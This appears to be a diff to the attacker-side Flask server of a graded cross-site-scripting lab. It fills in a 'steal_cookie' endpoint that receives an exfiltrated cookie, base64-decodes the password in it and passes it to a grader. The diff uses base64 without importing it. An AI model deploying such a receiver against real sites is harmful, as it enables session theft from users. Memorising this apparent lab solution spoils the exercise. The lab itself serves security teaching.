@@ -5,6 +5,7 @@ from http.cookies import SimpleCookie
 import sys
 sys.path.append("..")
 import grader
+import json
 
 app = Flask(__name__)
 
@@ -13,11 +14,15 @@ def steal_cookie(vuln_type):
     """
     Use this to exfiltrate a stolen cookie from the vulnerable server.
     """
-    received_cookie = request.args.get('cookie', default='') # Reads the `cookie` parameter
+    if vuln_type=='reflected':
+        received_cookie = request.args.get('cookie', default='') # Reads the `cookie` parameter
 
-    # grader.xss_verify(vuln_type, password) # Remember to decode the password.
+        password64=received_cookie.split('=')[-1]
+        password = base64.b64decode(password64).decode('utf-8')
 
-    return password
+        grader.xss_verify(vuln_type, password) # Remember to decode the password.
+
+    return received_cookie+'\n'
 
 # NOTE: You are free to add additional routes/endpoints to the attacker server to mount any attack of your choosing.
 if __name__ == '__main__':
